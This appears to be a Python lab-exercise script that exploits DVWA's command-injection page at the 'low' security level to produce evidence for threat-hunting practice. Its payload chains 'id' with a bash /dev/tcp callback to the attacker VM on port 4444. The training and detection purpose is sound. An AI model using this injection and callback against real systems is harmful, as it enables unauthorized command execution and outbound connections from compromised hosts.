#!/usr/bin/env python3
"""Exercise 1 (docs/decisions/first-targets-and-hunt-outcomes.md): DVWA command injection, difficulty `low`.

Run on the attacker VM after the operator started the exercise (labops.py exercise start ID --target T):
  exercise1 --exercise-id ID --target t1

Logs in to DVWA, forces security=low, submits a crafted value to /vulnerabilities/exec/ so the web worker runs a shell and
children beyond `ping`, and makes one outbound connection attempt from the target back to this VM (the network evidence;
the lab firewall is expected to block it). The User-Agent carries the exercise id, so the Apache request is findable by it.
Writes exercise1-<id>.json (the time window and payload) to the work directory for the hunt notes.
Lab details come from /etc/opaleye/lab.json (rendered by Ansible from network/plan.json), or --base-url/--attacker-ip.
"""
import argparse
import datetime
import http.cookiejar
import json
import os
import re
import sys
import urllib.parse
import urllib.request

LAB = "/etc/opaleye/lab.json"
CALLBACK_PORT = 4444


def now():
    return datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


class Session:
    def __init__(self, base, ua):
        self.base = base.rstrip("/")
        jar = http.cookiejar.CookieJar()
        self.op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
        self.op.addheaders = [("User-Agent", ua)]
        self.jar = jar

    def get(self, path):
        with self.op.open(self.base + path, timeout=30) as r:
            return r.status, r.read().decode("utf-8", "replace")

    def post(self, path, fields):
        data = urllib.parse.urlencode(fields).encode()
        with self.op.open(self.base + path, data=data, timeout=30) as r:
            return r.status, r.read().decode("utf-8", "replace")

    def token(self, path):
        _, html = self.get(path)
        m = re.search(r"name=['\"]user_token['\"] value=['\"]([0-9a-f]+)['\"]", html)
        if not m:
            raise SystemExit("no user_token on %s: is DVWA set up (database created) and reachable?" % path)
        return m.group(1)

    def set_cookie(self, name, value):
        host = urllib.parse.urlparse(self.base).hostname
        self.jar.set_cookie(http.cookiejar.Cookie(0, name, value, None, False, host, True, False, "/", True,
                                                   False, None, True, None, None, {}))


def main(argv):
    ap = argparse.ArgumentParser(prog="exercise1")
    ap.add_argument("--exercise-id", required=True)
    ap.add_argument("--target", default=None, help="t1 or t2 (address from /etc/opaleye/lab.json)")
    ap.add_argument("--base-url", default=None, help="override http://<target ip>")
    ap.add_argument("--attacker-ip", default=None)
    ap.add_argument("--workdir", default="/srv/exercise")
    ap.add_argument("--user", default="admin")
    ap.add_argument("--password", default="password", help="DVWA default credentials")
    a = ap.parse_args(argv[1:])

    base, attacker = a.base_url, a.attacker_ip
    if not (base and attacker):
        try:
            with open(LAB) as f:
                lab = json.load(f)
        except OSError:
            raise SystemExit("no %s: give --base-url and --attacker-ip" % LAB)
        attacker = attacker or lab["attacker_ip"]
        if not base:
            if a.target not in lab["targets"]:
                raise SystemExit("--target must be one of %s" % ", ".join(lab["targets"]))
            base = "http://%s" % lab["targets"][a.target]
    s = Session(base, "opaleye-exercise1/" + a.exercise_id)

    payload = "127.0.0.1; id; bash -c 'echo opaleye-%s > /dev/tcp/%s/%d'" % (a.exercise_id, attacker, CALLBACK_PORT)
    started = now()
    s.post("/login.php", {"username": a.user, "password": a.password, "Login": "Login",
                          "user_token": s.token("/login.php")})
    s.set_cookie("security", "low")
    _, out = s.post("/vulnerabilities/exec/", {"ip": payload, "Submit": "Submit",
                                                "user_token": s.token("/vulnerabilities/exec/")})
    ended = now()
    ran = bool(re.search(r"uid=\d+\(", out))
    record = {"exercise_id": a.exercise_id, "target": a.target, "base_url": base, "started": started, "ended": ended,
              "payload": payload, "command_output_seen": ran}
    os.makedirs(a.workdir, exist_ok=True)
    with open(os.path.join(a.workdir, "exercise1-%s.json" % a.exercise_id), "w") as f:
        json.dump(record, f, indent=2)
    print(json.dumps(record, indent=2))
    if not ran:
        print("injected command output not seen: not vulnerable at `low`, or not logged in", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv))
